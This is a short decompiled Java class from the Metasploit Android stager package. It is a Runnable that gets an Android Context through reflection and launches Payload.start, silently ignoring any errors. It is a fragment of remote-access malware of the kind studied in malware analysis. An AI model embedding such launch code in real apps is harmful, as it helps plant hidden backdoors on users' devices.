package com.metasploit.stage;

import android.content.Context;
import java.lang.reflect.Method;

/* renamed from: com.metasploit.stage.d */
final class C0003d implements Runnable {

    /* renamed from: a */
    private /* synthetic */ Method f14a;

    C0003d(Method method) {
        this.f14a = method;
    }

    public final void run() {
        try {
            Context context = (Context) this.f14a.invoke((Object) null, (Object[]) null);
            if (context != null) {
                Payload.start(context);
            }
        } catch (Exception e) {
        }
    }
}
